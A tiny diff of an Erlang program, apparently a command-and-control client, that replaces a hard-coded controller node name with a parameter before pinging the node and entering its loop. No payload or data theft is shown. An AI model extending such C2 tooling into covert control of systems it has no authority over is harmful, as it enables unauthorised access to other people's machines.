@@ -55,5 +55,5 @@ loop(C2ServerName) ->
 				     
 start(C2ServerName) ->
     io:format("Pinging remote server~n"),
-    net_adm:ping(list_to_atom("c2server@Natashas-MBP")),
+    net_adm:ping(list_to_atom(C2ServerName)),
     loop(C2ServerName).
